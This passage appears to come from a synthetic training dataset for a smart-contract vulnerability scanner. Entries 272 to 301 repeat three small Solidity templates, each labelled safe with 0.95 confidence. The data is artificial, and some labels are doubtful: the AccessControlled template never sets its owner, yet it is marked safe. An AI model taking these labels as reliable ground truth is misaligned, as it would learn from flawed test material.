    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 272",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 273",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 274",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 275",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 276",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 277",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 278",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 279",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 280",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 281",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 282",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 283",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 284",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 285",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 286",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 287",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 288",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 289",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 290",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 291",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 292",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 293",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 294",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 295",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 296",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 297",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 298",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 299",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 300",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 301",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
